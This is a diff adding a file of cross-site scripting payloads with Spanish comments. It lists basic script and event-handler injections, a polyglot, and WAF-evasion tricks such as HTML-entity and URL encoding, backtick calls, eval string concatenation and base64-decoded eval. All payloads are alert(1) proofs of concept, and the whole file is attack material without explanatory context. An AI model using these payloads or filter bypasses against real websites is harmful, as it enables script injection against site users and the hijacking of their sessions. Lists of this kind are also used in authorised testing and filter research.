@@ -1,0 +1,72 @@
+# xss_payloads
+
+---
+
+# ======================================================
+# XSS PAYLOADS + OFUSCACIÓN (reflejado, almacenado)
+# ======================================================
+
+# ----- BÁSICOS -----
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+
+# ----- SIN ETIQUETAS (eventos) -----
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+onload=alert(1)
+onerror=alert(1)
+
+# ----- POLYGLOT (funciona en muchos contextos) -----
+javascript:"/*'/*`/*--></noscript></title></textarea></style><svg/onload=alert(1)>"
+
+# ----- OFUSCACIÓN WAF -----
+# Codificación HTML (decimal/hex)
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# Codificación URL
+%3Cscript%3Ealert(1)%3C/script%3E
+
+# Uso de backticks en lugar de paréntesis
+<script>alert`1`</script>
+
+# Ofuscación con concatenación
+<script>alert(1)</script>  -->  <script>eval('al'+'ert(1)')</script>
+
+# Uso de `eval` y base64
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Sin paréntesis
+<script>alert`1`</script>
+<body onload=alert`1`>
+
+# Ofuscación con variables
+<script>var a='ale';var b='rt(1)';eval(a+b)</script>
+
+# Uso de `self`, `top`, `parent`
+<svg/onload=self.alert(1)>
+
+# Inyección en atributos (bypass quote filter)
+onclick=alert(1)  (si el atributo no está entrecomillado)
+
+# Uso de caracteres de nueva línea / tabulación
+<svg/onload=alert(1)>
+<svg/onload=alert(1)>
+
+# Ofuscación con comentarios HTML
+<!--<script>alert(1)</script>-->
+
+# Uso de `javascript:` en href
+<a href="javascript:alert(1)">test</a>
+
+# Bypass de espacios con / (barra)
+<svg/onload=alert(1)>
+
+# Uso de fuentes alternativas (HTML5)
+<video><source onerror=alert(1)>
+
